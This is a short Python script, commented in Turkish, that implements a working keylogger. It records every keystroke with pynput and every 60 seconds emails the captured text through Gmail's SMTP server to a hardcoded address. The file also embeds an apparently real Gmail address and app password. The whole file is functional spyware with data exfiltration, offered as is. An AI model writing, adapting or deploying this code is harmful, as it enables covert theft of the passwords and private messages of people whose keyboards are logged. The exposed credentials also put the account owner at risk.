from pynput import keyboard
import smtplib
import threading
import os

#Log verisi burada tutalacak
log = ""

#Gmail ayarları
EMAIL_ADDRESS = "gkdeniz0005@gmail.com"
EMAIL_PASSWORD = "aahb mvse nqxh qhax" # Gmail'de "uygulama şifresi" gerekir
EMAIL_TO = "gkdeniz0005@gmail.com"

STOP_FILE = "stop.txt" #Bu dosya varsa keylogger durur

def send_email(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, EMAIL_TO, message)
        server.quit()
    except Exception as e:
        print(f"Mail gönderilemedi!: {e}")

def callback(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key}]"

def report():
    global log 

    if os.path.exists(STOP_FILE):
        send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, "[KEYLOGGER DURDURULDU]")
        return
    
    if log:
        send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, log)
        log = ""
    #Her 60 saniyede bir tekrar çalışır
    timer = threading.Timer(60, report)
    timer.start()

#Keylogger başlatma
listener = keyboard.Listener(on_press=callback)
listener.start()
report()
listener.join()
